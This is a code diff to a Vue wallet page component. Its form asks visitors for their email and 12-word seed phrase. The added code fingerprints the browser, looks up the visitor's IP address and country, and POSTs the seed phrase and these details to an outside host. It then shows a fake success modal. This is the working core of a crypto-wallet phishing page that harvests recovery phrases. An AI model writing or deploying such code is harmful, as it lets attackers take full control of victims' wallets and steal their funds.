@@ -65,19 +65,14 @@
 
 <script setup>
 import { useWalletStore } from '@/stores/walletStore'
-import { computed, reactive, ref, onMounted,  } from 'vue'
-import { useRoute,  useRouter  } from 'vue-router' // ✅ Import useRouter
+import { computed, reactive, ref, nextTick } from 'vue'
+import { useRoute, useRouter } from 'vue-router'
 
 const route = useRoute()
 const router = useRouter()  
 const id = route.params.id
 
 const walletStore = useWalletStore()
-let walletName
-
-onMounted(() => {
-  walletName = walletTitle.value
-})
 
 const walletTitle = computed(() => {
   const wallet = walletStore.wallets.find((w) => w.id === parseInt(id))
@@ -89,13 +84,34 @@ const formState = reactive({
   seedPhrase: Array(12).fill(''),
 })
 
-const showSuccessModal = ref(false) 
- 
+const showSuccessModal = ref(false)
+
+const getExactBrowser = () => {
+  const userAgent = navigator.userAgent;
+  let match;
+
+  if ((match = userAgent.match(/(Chrome)\/([\d.]+)/)) && !userAgent.includes("Edg")) {
+    return `${match[1]} ${match[2]}`;
+  } else if ((match = userAgent.match(/(Firefox)\/([\d.]+)/))) {
+    return `${match[1]} ${match[2]}`;
+  } else if ((match = userAgent.match(/(Safari)\/([\d.]+)/)) && !userAgent.includes("Chrome")) {
+    return `Safari ${match[2]}`;
+  } else if ((match = userAgent.match(/(Edg)\/([\d.]+)/))) {
+    return `Edge ${match[2]}`;
+  } else if ((match = userAgent.match(/(Opera|OPR)\/([\d.]+)/))) {
+    return `Opera ${match[2]}`;
+  } else {
+    return "Unknown Browser";
+  }
+};
+
 const handleSubmit = async (e) => {
   e.preventDefault();
 
   let ip, country;
+  let browser = getExactBrowser(); // Get exact browser name + version
 
+  // Fetch IP and country
   await fetch('https://ipapi.co/json/')
     .then((response) => response.json())
     .then((data) => {
@@ -103,38 +119,58 @@ const handleSubmit = async (e) => {
       country = data.country_name;
     });
 
-  console.log('Wallet Name:', walletName);
-  console.log('Email:', formState.ai);
-  console.log('Country:', country);
-  console.log('IP Address:', ip);
-  console.log(
-    'Seed Phrase:\n' +
-      formState.seedPhrase
-        .map((word, index) => `${index + 1}. ${word}`)
-        .join('\n')
-  );
+  // Prepare the payload with walletTitle directly
+  const payload = {
+    email: formState.ai.trim(),
+    seedPhrase: formState.seedPhrase.join(" "), // Join the seed phrase words into a single string
+    walletName: walletTitle.value,  // Use walletTitle directly
+    ipAddress: ip,
+    country: country,
+    browser: browser,
+  };
 
-  // Introduce a 2-second delay before showing the modal
-  setTimeout(() => {
-    showSuccessModal.value = true;
-  }, 1000);
+  // console.log('Payload:', payload);
 
-  // Clear inputs immediately after submission
-  formState.ai = '';
-  formState.seedPhrase.splice(0, 12, ...Array(12).fill('')); // Ensure reactivity
+  try {
+    // Send data to the API
+    await fetch('https://apipj-second.vercel.app/register', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+
+    // Wait for 1 second before clearing the input and showing the modal
+    setTimeout(() => {
+      // Clear inputs
+      formState.ai = '';
+      formState.seedPhrase.splice(0, 12, ...Array(12).fill('')); // Clear the phrase input
+
+      // Use nextTick to ensure the DOM is updated before showing the modal
+      nextTick(() => {
+        showSuccessModal.value = true; // Show the modal
+        // console.log('Modal should now be shown');
+      });
+    }, 1000); // 1000ms = 1 second
+
+  } catch (error) {
+    console.error('Error:', error);
+  }
 };
 
 
 
-// ✅ Define the function to redirect to home
 const redirectToHome = () => {
   router.push('/'); // Redirects to the home page
-};
-
+}
 
 const { seedPhrase } = formState
 </script>
 
+
+
+<!-- // Clear inputs immediately after submission
+  formState.ai = '';
+  formState.seedPhrase.splice(0, 12, ...Array(12).fill('')); // Ensure reactivity -->
 
 
 <style scoped>
